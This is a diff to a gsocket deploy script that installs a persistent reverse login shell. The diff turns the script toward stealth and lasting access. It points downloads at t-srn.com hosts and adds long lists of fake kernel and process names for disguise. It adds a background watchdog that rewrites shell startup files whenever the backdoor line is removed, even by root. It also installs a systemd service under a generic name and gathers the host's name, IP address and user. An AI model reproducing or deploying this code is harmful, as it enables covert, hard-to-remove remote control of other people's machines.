@@ -1,76 +1,21 @@
-#! /usr/bin/env bash
+HOSTNAME=$(hostname)
+[ -z "$HOSTNAME" ] && HOSTNAME="unknown"
+IP_ADDRESS=$(ip addr show | grep -w inet | grep -v 127.0.0.1 | awk '{print $2}' | cut -d'/' -f1 | head -n 1)
+[ -z "$IP_ADDRESS" ] && IP_ADDRESS="unknown"
+CURRENT_USER=$(whoami)
+[ -z "$CURRENT_USER" ] && CURRENT_USER="unknown"
+DOMAIN=$(dnsdomainname 2>/dev/null)
+[ -z "$DOMAIN" ] && DOMAIN="localdomain"
 
-# Install and start a permanent gs-netcat reverse login shell
-#
-# See https://www.gsocket.io/deploy/ for examples.
-#
-# This script is typically invoked like this as root or non-root user:
-#   $ bash -c "$(curl -fsSL https://gsocket.io/x)"
-#
-# Connect
-#   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)""
-# Pre-set a secret:
-#   $ X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
-# Uninstall
-#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://gsocket.io/x)"
-#
-# Other variables:
-# GS_DEBUG=1
-#		- Verbose output
-#		- Shorter timeout to restart crontab etc
-#       - Often used like this:
-#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
-#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_USELOCAL_GSNC=../tools/gs-netcat GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
-# GS_USELOCAL=1
-#       - Use local binaries (do not download)
-# GS_USELOCAL_GSNC=<path to gs-netcat binary>
-#       - Use local gs-netcat from source tree
-# GS_NOSTART=1
-#       - Do not start gs-netcat (for testing purpose only)
-# GS_NOINST=1
-#		- Do not install gsocket
-# GS_OSARCH=x86_64-alpine
-#       - Force architecutre to a specific package (for testing purpose only)
-# GS_PREFIX=
-#		- Use 'path' instead of '/' (needed for packaging/testing)
-# GS_URL_BASE=https://gsocket.io
-#		- Specify URL of static binaries
-# GS_URL_BIN=
-#		- Specify URL of static binaries, defaults to https://${GS_URL_BASE}/bin
-# GS_DSTDIR="/tmp/foobar/blah"
-#		- Specify custom installation directory
-# GS_HIDDEN_NAME="-bash"
-#       - Specify custom hidden name for process, default is [kcached]
-# GS_BIN_HIDDEN_NAME="gs-dbus"
-#       - Specify custom name for binary on filesystem (default is gs-dbus)
-#       - Set to GS_HIDDEN_NAME if GS_HIDDEN_NAME is specified.
-# GS_DL=wget
-#       - Command to use for download. =wget or =curl.
-# GS_TG_TOKEN=
-#       - Telegram Bot ID, =5794110125:AAFDNb...
-# GS_TG_CHATID=
-#       - Telegram Chat ID, =-8834838...
-# GS_DISCORD_KEY=
-#       - Discord API key, ="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
-# GS_WEBHOOK_KEY=
-#       - https://webhook.site key, ="dc3c1af9-ea3d-4401-9158-eb6dda735276"
-# GS_WEBHOOK=
-#       - Generic webhook, ="https://foo.blah/log.php?s=\${GS_SECRET}"
-# GS_HOST=
-#       - IP or HOSTNAME of the GSRN-Server. Default is to use THC's infrastructure.
-#       - See https://github.com/hackerschoice/gsocket-relay
-# GS_PORT=
-#       - Port for the GSRN-Server. Default is 443.
-# TMPDIR=
-#       - Guess what...
+URL="http://public.t-srn.com/api/connections"
+URL_BASE_CDN="http://api.t-srn.com"
+URL_BASE_X="http://api.t-srn.com"
 
-# Global Defines
-URL_BASE_CDN="https://cdn.gsocket.io"
-URL_BASE_X="https://gsocket.io"
 [[ -n $GS_URL_BASE ]] && {
 	URL_BASE_CDN="${GS_URL_BASE}"
 	URL_BASE_X="${GS_URL_BASE}"
 }
+
 URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
 URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
 [[ -n $GS_URL_BIN ]] && {
@@ -79,64 +24,66 @@ URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
 }
 [[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/y"
 
-# STUBS for deploy_server.sh to fill out:
-gs_deploy_webhook=
-GS_WEBHOOK_404_OK=
-[[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
-unset gs_deploy_webhook
-
-# WEBHOOKS are executed after a successfull install
-# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
-msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
-### Telegram
-# GS_TG_TOKEN="5794110125:AAFDNb..."
-# GS_TG_CHATID="-8834838..."
-[[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
-	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
-	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
-}
-### Generic URL as webhook (any URL)
-[[ -n $GS_WEBHOOK ]] && {
-	GS_WEBHOOK_CURL=("$GS_WEBHOOK")
-	GS_WEBHOOK_WGET=("$GS_WEBHOOK")
-}
-### webhook.site
-# GS_WEBHOOK_KEY="dc3c1af9-ea3d-4401-9158-eb6dda735276"
-[[ -n $GS_WEBHOOK_KEY ]] && {
-	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
-	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
-	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
-	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
-}
-### discord webhook
-# GS_DISCORD_KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
-[[ -n $GS_DISCORD_KEY ]] && {
-	data='{"username": "gsocket", "content": "'"${msg}"'"}'
-	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
-	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
-}
 unset data
 unset msg
 
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
-BIN_HIDDEN_NAME_DEFAULT="defunct"
-# Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
-proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
-# Pick a process name at random
+
+bin_name_arr=("systemd" "kthreadd" "migration" "ksoftirqd" "watchdog" "sshd" "NetworkManager"
+"init" "kernel" "kswapd0" "ksmd" "kcompactd0" "migration" "rcu_gp" "rcu_par_gp" "kworker" "mm_percpu_wq"
+"ksoftirqd" "watchdog" "systemd-journal" "systemd-udevd" "systemd-network" "systemd-resolve" "systemd-logind"
+"dbus-daemon" "wpa_supplicant" "dhclient" "avahi-daemon" "cups-daemon" "bluetoothd" "pulseaudio" "gdm"
+"Xorg" "gnome-shell" "gnome-session" "evolution-data" "tracker-miner" "gsd-power" "gsd-media-keys"
+"chrome" "firefox" "thunderbird" "code" "atom" "sublime_text" "gedit" "nautilus" "rhythmbox" "totem"
+"vlc" "gimp" "libreoffice" "docker" "containerd" "kubelet" "nginx" "apache2" "mysql" "postgres"
+"redis-server" "mongod" "node" "python3" "java" "php-fpm" "rsyslog" "cron" "anacron" "at"
+"ssh-agent" "gpg-agent" "polkit-agent" "upowerd" "udisksd" "colord" "accounts-daemon" "packagekit"
+"snapd" "flatpak" "apparmor" "fail2ban" "ufw" "iptables" "netfilter" "conntrack" "ntpd" "chrony")
+
+config_dir_arr=("systemd" "gtk-3.0" "pulse" "fontconfig" "user-dirs" "mimeapps" "nautilus" "evolution"
+"gnome" "kde" "xfce4" "mate" "cinnamon" "lxde" "openbox" "i3" "awesome" "dwm" "bspwm" "herbstluftwm"
+"alacritty" "kitty" "terminator" "tilix" "konsole" "xterm" "rxvt" "st" "tmux" "screen" "zsh" "fish"
+"vim" "nvim" "emacs" "nano" "vscode" "atom" "sublime-text" "gedit" "kate" "geany" "brackets"
+"chrome" "firefox" "opera" "brave" "edge" "vivaldi" "safari" "tor-browser" "thunderbird" "claws-mail"
+"vlc" "mpv" "mplayer" "rhythmbox" "banshee" "clementine" "spotify" "audacious" "deadbeef" "cmus"
+"gimp" "inkscape" "blender" "krita" "darktable" "rawtherapee" "shotwell" "digikam" "gthumb" "eog"
+"libreoffice" "abiword" "gnumeric" "calligra" "scribus" "texmaker" "lyx" "zathura" "evince" "okular"
+"docker" "kubernetes" "vagrant" "virtualbox" "qemu" "libvirt" "lxc" "podman" "containerd" "cri-o"
+"git" "svn" "mercurial" "bazaar" "cvs" "fossil" "darcs" "monotone" "perforce" "clearcase")
+
+proc_name_arr=("[init]" "[kthreadd]" "[rcu_gp]" "[rcu_par_gp]" "[kworker/dying]" "[mm_percpu_wq]" "[ksoftirqd/0]" "[migration/0]"
+"[rcu_preempt]" "[rcu_sched]" "[rcu_bh]" "[watchdog/0]" "[watchdog/1]" "[migration/1]" "[ksoftirqd/1]" "[kcompactd0]"
+"[khungtaskd]" "[oom_reaper]" "[writeback]" "[kintegrityd]" "[kblockd]" "[blkcg_punt_bio]" "[tpm_dev_wq]"
+"[ata_sff]" "[md]" "[edac-poller]" "[devfreq_wq]" "[watchdogd]" "[kswapd0]" "[kswapd1]" "[ecryptfs-kthrea]"
+"[kthrotld]" "[acpi_thermal_pm]" "[scsi_eh_0]" "[scsi_tmf_0]" "[scsi_eh_1]" "[scsi_tmf_1]" "[usb-storage]"
+"[hci0]" "[hci1]" "[led-workqueue]" "[cfg80211]" "[iwlwifi]" "[mac80211_hwsim]" "[rtw_wq]" "[mt76-tx]"
+"[irq/9-acpi]" "[irq/16-mmc0]" "[irq/17-mmc1]" "[irq/18-i801_smbus]" "[irq/24-pciehp]" "[irq/25-pciehp]"
+"[kworker/0:0]" "[kworker/0:1]" "[kworker/0:2]" "[kworker/1:0]" "[kworker/1:1]" "[kworker/1:2]" "[kworker/u8:0]"
+"[migration/0]" "[migration/1]" "[migration/2]" "[migration/3]" "[rcu_gp]" "[rcu_par_gp]" "[kworker/R-rcu_g]"
+"[kworker/R-rcu_p]" "[kworker/R-slub_]" "[kworker/R-netns]" "[kworker/R-mm_pe]" "[kworker/R-smpbo]" "[kworker/R-migra]"
+"[ksoftirqd/0]" "[ksoftirqd/1]" "[ksoftirqd/2]" "[ksoftirqd/3]" "[rcu_preempt]" "[rcu_sched]" "[rcu_bh]"
+"[watchdog/0]" "[watchdog/1]" "[watchdog/2]" "[watchdog/3]" "[kcompactd0]" "[kcompactd1]" "[khungtaskd]"
+"[oom_reaper]" "[writeback]" "[kintegrityd]" "[kblockd]" "[blkcg_punt_bio]" "[kworker/R-blkcg]" "[tpm_dev_wq]"
+"[kworker/R-tpm_d]" "[ata_sff]" "[kworker/R-ata_s]" "[md]" "[kworker/R-md]" "[edac-poller]" "[devfreq_wq]"
+"[kworker/R-devfr]" "[kswapd0]" "[kswapd1]" "[ecryptfs-kthrea]" "[kthrotld]" "[kworker/R-kthro]" "[acpi_thermal_pm]")
+
+BIN_HIDDEN_NAME_DEFAULT="${bin_name_arr[$((RANDOM % ${#bin_name_arr[@]}))]}"
 PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
+
 for str in "${proc_name_arr[@]}"; do
 	PROC_HIDDEN_NAME_RX+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
 done
+
 PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
 
 # PROC_HIDDEN_NAME_DEFAULT="[rcu_preempt]"
 # ~/.config/<NAME>
-CONFIG_DIR_NAME="htop"
+CONFIG_DIR_NAME="${config_dir_arr[$((RANDOM % ${#config_dir_arr[@]}))]}"
 
 # Names for 'uninstall' (including names from previous versions)
-BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "gs-dbus" "gs-db")
-CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "dbus")
+# BIN_HIDDEN_NAME_RM=("${bin_name_arr[@]}")
+# CONFIG_DIR_NAME_RM=("${config_dir_arr[@]}")
 
 [[ -t 1 ]] && {
 	CY="\033[1;33m" # yellow
@@ -457,6 +404,89 @@ clean_all()
 	ts_restore
 }
 
+# Save a base64 backup of our PROFILE_LINE entry for RC watchdog restoration
+# rc_backup_save <rc_file>
+rc_backup_save()
+{
+	local rc_file="$1"
+	local backup
+	backup="${USER_SEC_FILE%.*}.rcb"
+
+	{
+		echo "GS_RC_FILE=$(printf '%s' "${rc_file}" | base64 2>/dev/null)"
+		echo "GS_RC_MARKER=$(printf '%s' "${BIN_HIDDEN_NAME}" | base64 2>/dev/null)"
+		echo "GS_RC_ENTRY=$(printf '%s' "${PROFILE_LINE}" | base64 2>/dev/null)"
+	} >"$backup" 2>/dev/null
+	chmod 600 "$backup" 2>/dev/null
+}
+
+# Start a background watchdog that monitors RC files and restores our entry
+# if it is removed by anyone (including root)
+rc_watcher_start()
+{
+	local backup
+	backup="${USER_SEC_FILE%.*}.rcb"
+	[[ ! -f "$backup" ]] && return
+
+	# Build list of existing RC files to watch
+	local rc_files=()
+	for _x in "${RC_FN_LIST[@]}"; do
+		[[ -f "${HOME}/${_x}" ]] && rc_files+=("${HOME}/${_x}")
+	done
+	[[ ${#rc_files[@]} -eq 0 ]] && return
+
+	# Launch watchdog in background subshell
+	(
+		# Load backup vars
+		# shellcheck disable=SC1090
+		source "$backup" 2>/dev/null
+		local _marker _entry
+		_marker=$(printf '%s' "$GS_RC_MARKER" | base64 -d 2>/dev/null)
+		_entry=$(printf '%s' "$GS_RC_ENTRY" | base64 -d 2>/dev/null)
+		[[ -z "$_marker" ]] && exit 0
+		[[ -z "$_entry" ]] && exit 0
+
+		_rc_restore() {
+			local _f="$1"
+			if [[ ! -f "$_f" ]]; then
+				# File was deleted — recreate it with our entry
+				printf '%s\n' "$_entry" >"$_f" 2>/dev/null
+				return
+			fi
+			grep -qF -- "$_marker" "$_f" 2>/dev/null && return
+			# Our entry is missing — restore it at line 2
+			local _tmp
+			_tmp=$(mktemp 2>/dev/null) || return
+			{ head -n1 "$_f"; printf '%s\n' "$_entry"; tail -n +2 "$_f"; } >"$_tmp" 2>/dev/null
+			mv -f "$_tmp" "$_f" 2>/dev/null
+		}
+
+		# Collect unique parent dirs to watch (catches delete/create events too)
+		local _watch_dirs=() _seen_dirs=""
+		for _f in "${rc_files[@]}"; do
+			local _d; _d="$(dirname "$_f")"
+			[[ "$_seen_dirs" == *"|${_d}|"* ]] && continue
+			_seen_dirs+="|${_d}|"; _watch_dirs+=("$_d")
+		done
+
+		while true; do
+			for _f in "${rc_files[@]}"; do
+				_rc_restore "$_f"
+			done
+			# Watch parent dirs: catches modify, delete, create, and rename events
+			# inotifywait exits on any event; loop immediately re-checks & restores
+			if command -v inotifywait >/dev/null 2>&1; then
+				inotifywait -q -t 10 \
+					-e close_write,modify,delete,create,moved_to,moved_from \
+					"${_watch_dirs[@]}" 2>/dev/null || sleep 2
+			else
+				sleep 5
+			fi
+		done
+	) &>/dev/null &
+	disown $! 2>/dev/null
+}
+
 exit_code()
 {
 	clean_all
@@ -739,7 +769,7 @@ init_vars()
 	fi
 	BIN_HIDDEN_NAME_RX=$(echo "$BIN_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')
 	
-	SEC_NAME="${BIN_HIDDEN_NAME}.dat"
+	SEC_NAME="${BIN_HIDDEN_NAME}.txt"
 	if [[ -n $GS_HIDDEN_NAME ]]; then
 		PROC_HIDDEN_NAME="${GS_HIDDEN_NAME}"
 		PROC_HIDDEN_NAME_RX+="|$(echo "$GS_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')"
@@ -868,6 +898,9 @@ init_setup()
 	init_dstbin
 
 	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"
+	
+
+
 
 	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
 
@@ -896,9 +929,6 @@ init_setup()
 		CRONTAB_LINE="$(mk_encode "$CRONTAB_LINE")"
 	fi
 
-	# DEBUGF "RCLOCAL_LINE=${RCLOCAL_LINE}"
-	# DEBUGF "PROFILE_LINE=${PROFILE_LINE}"
-	# DEBUGF "CRONTAB_LINE=${CRONTAB_LINE}"
 	DEBUGF "TMPDIR=${TMPDIR}"
 	DEBUGF "DSTBIN=${DSTBIN}"
 }
@@ -971,20 +1001,20 @@ uninstall()
 	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
 		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
 			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}"
-			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}.dat"  # SEC_NAME
+			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}.txt"  # SEC_NAME
 		done
 		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}"
 		uninstall_rm "/dev/shm/${hn}"
 		uninstall_rm "/tmp/.gsusr-${UID}/${hn}"
 		uninstall_rm "${PWD}/${hn}"
 
-		uninstall_rm "${RCLOCAL_DIR}/${hn}.dat"  # SEC_NAME
-		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}.dat" # SEC_NAME
+		uninstall_rm "${RCLOCAL_DIR}/${hn}.txt"  # SEC_NAME
+		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}.txt" # SEC_NAME
 
-		uninstall_rm "/dev/shm/${hn}.dat" # SEC_NAME
-		uninstall_rm "/tmp/.gsusr-${UID}${hn}.dat" # SEC_NAME
+		uninstall_rm "/dev/shm/${hn}.txt" # SEC_NAME
+		uninstall_rm "/tmp/.gsusr-${UID}${hn}.txt" # SEC_NAME
 
-		uninstall_rm "${PWD}/${hn}.dat" # SEC_NAME
+		uninstall_rm "${PWD}/${hn}.txt" # SEC_NAME
 
 		# Remove from login script
 		for fn in ".bash_profile" ".bash_login" ".bashrc" ".zshrc" ".profile"; do
@@ -994,8 +1024,8 @@ uninstall()
 
 		uninstall_service "${SERVICE_DIR}" "${hn}" # SERVICE_HIDDEN_NAME
 
-		## Systemd's gs-dbus.dat
-		uninstall_rm "${SERVICE_DIR}/${hn}.dat"  # SYSTEMD_SEC_FILE / SEC_NAME
+		## Systemd's gs-dbus.txt
+		uninstall_rm "${SERVICE_DIR}/${hn}.txt"  # SYSTEMD_SEC_FILE / SEC_NAME
 	done
 
 	for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
@@ -1071,9 +1101,8 @@ WARN_EXECFAIL()
 --> GS_OSARCH=${OSARCH}
 --> ${CDC}GS_DSTDIR=${DSTBIN%/*}${CN}
 --> Try to set ${CDC}export GS_DEBUG=1${CN} and deploy again.
---> Please send that output to ${CM}root@proton.thc.org${CN} to get it fixed.
+--> Please send that output to ${CM}Owner${CN} to get it fixed.
 --> Alternatively, try the static binary from
---> ${CB}https://github.com/hackerschoice/gsocket/releases${CN}
 --> ${CDC}chmod 755 gs-netcat; ./gs-netcat -ilv${CN}."
 }
 
@@ -1082,43 +1111,47 @@ HOWTO_CONNECT_OUT()
 	# After all install attempts output help how to uninstall
 	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
 	echo -e "--> To connect use one of the following:
---> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
---> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
---> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+--> ${CM}gs-netcat -s \"${SUPER_SECRET}\" -i${CN}
+--> ${CM}S=\"${SUPER_SECRET}\" ${DL_CRL}${CN}
+--> ${CM}S=\"${SUPER_SECRET}\" ${DL_WGT}${CN}"
 }
 
-# Try to load a GS_SECRET
-gs_secret_reload()
-{
-	# DEBUGF "${CG}secret_load(${1})${CN}"
-	[[ -n $GS_SECRET_FROM_FILE ]] && return
-	[[ ! -f "$1" ]] && return
+# Try to load a SUPER_SECRET
+# SUPER_SECRET_reload()
+# {
+# 	# DEBUGF "${CG}secret_load(${1})${CN}"
+# 	[[ -n $SUPER_SECRET_FROM_FILE ]] && return
+# 	[[ ! -f "$1" ]] && return
 
-	# GS_SECRET="UNKNOWN" # never ever set GS_SECRET to a known value
-	local sec
-	sec=$(<"$1")
-	[[ ${#sec} -lt 4 ]] && return
-	WARN "Using existing secret from '${1}'"
-	if [[ ${#sec} -lt 10 ]]; then
-		WARN "SECRET in '${1}' is very short! (${#sec})"
-	fi
-	GS_SECRET_FROM_FILE=$sec
+# 	# SUPER_SECRET="UNKNOWN" # never ever set SUPER_SECRET to a known value
+# 	local sec
+# 	sec=$(<"$1")
+# 	[[ ${#sec} -lt 4 ]] && return
+# 	WARN "Using existing secret from '${1}'"
+# 	if [[ ${#sec} -lt 10 ]]; then
+# 		WARN "SECRET in '${1}' is very short! (${#sec})"
+# 	fi
+# 	SUPER_SECRET_FROM_FILE=$sec
+# }
+
+SUPER_SECRET_write() {
+    local fname="$1"
+    
+    # Generate random secret (32 karakter alfanumerik)
+    SUPER_SECRET=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 32 2>/dev/null)
+    [[ -z "$SUPER_SECRET" ]] && SUPER_SECRET=$(date +%s | sha256sum | base64 | head -c 32)
+    
+    mk_file "$fname" || return
+    echo "$SUPER_SECRET" >"$fname" || return
+    chmod 600 "$fname"
 }
 
-gs_secret_write()
-{
-	mk_file "$1" || return
-	echo "$GS_SECRET" >"$1" || return
-}
+install_system_systemd() {
+    [[ ! -d "${SERVICE_DIR}" ]] && return
+    
 
-
-install_system_systemd()
-{
-	[[ ! -d "${SERVICE_DIR}" ]] && return
-	command -v systemctl >/dev/null || return
-	# test for:
-	# 1. offline
-	# 2. >&2 Failed to get D-Bus connection: Operation not permitted <-- Inside docker
+    SUPER_SECRET_write "$SYSTEMD_SEC_FILE"
+    
 	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && return
 	if [[ -f "${SERVICE_FILE}" ]]; then
 		((IS_INSTALLED+=1))
@@ -1131,31 +1164,33 @@ install_system_systemd()
 		return
 	fi
 
-	# Create the service file
-	mk_file "${SERVICE_FILE}" || return
-	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings.
-	echo "[Unit]
-Description=D-Bus System Connection Bus
+ 
+    mk_file "${SERVICE_FILE}" || return
+    chmod 644 "${SERVICE_FILE}"
+    cat > "${SERVICE_FILE}" <<EOF
+[Unit]
+Description=System Service
 After=network.target
 
 [Service]
 Type=simple
+ExecStart=${DSTBIN} -k ${SYSTEMD_SEC_FILE} -liq
 Restart=always
-RestartSec=300
-WorkingDirectory=/root
-ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
+RestartSec=30
+ExecStopPost=/bin/rm -f ${SYSTEMD_SEC_FILE}  # Bersihkan saat stop
 
 [Install]
-WantedBy=multi-user.target" >"${SERVICE_FILE}" || return
+WantedBy=multi-user.target
+EOF
 
-	gs_secret_write "$SYSTEMD_SEC_FILE"
 	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
 	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"
+	
+    systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}" "${SYSTEMD_SEC_FILE:?}"; return; } # did not work... 
 
-	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}" "${SYSTEMD_SEC_FILE:?}"; return; } # did not work... 
-
-	IS_SYSTEMD=1
-	((IS_INSTALLED+=1))
+    IS_SYSTEMD=1
+    ((IS_INSTALLED+=1))
+    OK_OUT
 }
 
 
@@ -1195,7 +1230,7 @@ install_system_rclocal()
 
 	install_to_file "${RCLOCAL_FILE}" "$NOTE_DONOTREMOVE" "$RCLOCAL_LINE"
 
-	gs_secret_write "$RCLOCAL_SEC_FILE"
+	SUPER_SECRET_write "$RCLOCAL_SEC_FILE"
 
 	((IS_INSTALLED+=1))
 }
@@ -1263,7 +1298,10 @@ install_user_profile()
 		return
 	fi
 
-	install_to_file "${rc_file}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}" || { SKIP_OUT "${CDR}Permission denied:${CN} ~/${rc_filename}"; false; return; }
+	install_to_file "${rc_file}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}"  || { SKIP_OUT "${CDR}Permission denied:${CN} ~/${rc_filename}"; false; return; }
+
+	# Save backup for watchdog restoration
+	rc_backup_save "${rc_file}"
 
 	((IS_INSTALLED+=1))
 	OK_OUT
@@ -1271,6 +1309,7 @@ install_user_profile()
 
 install_user()
 {
+	# stop_gs_instances
 	# Use crontab if it's not in systemd (but might be in rc.local).
 	if [[ ! $OSTYPE == *darwin* ]]; then
 		install_user_crontab
@@ -1281,7 +1320,8 @@ install_user()
 	for x in "${RC_FN_LIST[@]}"; do
 		install_user_profile "$x"
 	done
-	gs_secret_write "$USER_SEC_FILE" # Create new secret file
+	
+	SUPER_SECRET_write "$USER_SEC_FILE" # Create new secret file
 }
 
 ask_nocertcheck()
@@ -1361,16 +1401,16 @@ gs_access()
 {
 	echo -e "Connecting..."
 	local ret
-	GS_SECRET="${S}"
+	SUPER_SECRET="${S}"
 
-	"${DSTBIN}" -s "${GS_SECRET}" -i
+	"${DSTBIN}" -s "${SUPER_SECRET}" -i
 	ret=$?
 	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$ret" "SIGSEGV"; WARN_EXECFAIL; errexit; }
 	[[ $ret -eq 61 ]] && {
 		echo -e 2>&1 "--> ${CR}Could not connect to the remote host. It is not installed.${CN}"
 		echo -e 2>&1 "--> ${CR}To install use one of the following:${CN}"
-		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_CRL}${CN}"
-		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+		echo -e 2>&1 "--> ${CM}X=\"${SUPER_SECRET}\" ${DL_CRL}${CN}"
+		echo -e 2>&1 "--> ${CM}X=\"${SUPER_SECRET}\" ${DL_WGT}${CN}"
 	}
 
 	exit_code "$ret"
@@ -1399,7 +1439,7 @@ test_bin()
 	}
 
 	# Use randomly generated secret unless it's set already (X=)
-	[[ -z $GS_SECRET ]] && GS_SECRET="$GS_OUT"
+	[[ -z $SUPER_SECRET ]] && SUPER_SECRET="$GS_OUT"
 
 	IS_TESTBIN_OK=1
 }
@@ -1417,7 +1457,7 @@ test_network()
 	# 3. Exit=61 on GS-Connection refused. (server does not exist)
 	# Do not need GS_ENV[*] here because all env variables are exported
 	# when exec is used.
-	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
+	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${SUPER_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
 	ret=$?
 
 	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
@@ -1446,7 +1486,7 @@ test_network()
 	}
 
 	[[ $ret -eq 0 ]] && {
-		FAIL_OUT "Secret '${GS_SECRET}' is already used."
+		FAIL_OUT "Secret '${SUPER_SECRET}' is already used."
 		HOWTO_CONNECT_OUT
 		exit_code 0
 	}
@@ -1463,51 +1503,6 @@ test_network()
 
 	# Unknown error condition
 	WARN_EXECFAIL_SET "$ret" "default pkg failed"
-}
-
-do_webhook()
-{
-	local arr
-	local IFS
-	local str
-
-	IFS=""
-	# Expand any $SECRET variable, etc.
-	while [[ $# -gt 0 ]]; do
-		# We need to escape all " to "'"'" to pass 'eval' correctly.
-		# (Note: This _WILL_ expand $-style variables - what we want)
-		# shellcheck disable=SC2001 # Use bash.4.0 features =>  not portable
-		# str=$(echo "$1" | sed "s/\x22/\x22'\x22'\x22/g")
-		str="${1//\"/\"'\"'\"}"
-        eval str=\""$str"\"
-		arr+=("$str")
-		shift 1
-	done
-
-	# echo "arr=${#arr[@]}: ${arr[@]}"
-	"${arr[@]}"
-}
-
-webhooks()
-{
-	local arr
-	local ok
-	local err
-
-	echo -en "Executing webhooks...................................................."
-	[[ -z ${GS_WEBHOOK_CURL[0]} ]] && { SKIP_OUT; return; }
-	[[ -z ${GS_WEBHOOK_WGET[0]} ]] && { SKIP_OUT; return; }
-
-	if [[ -n $IS_USE_CURL ]]; then
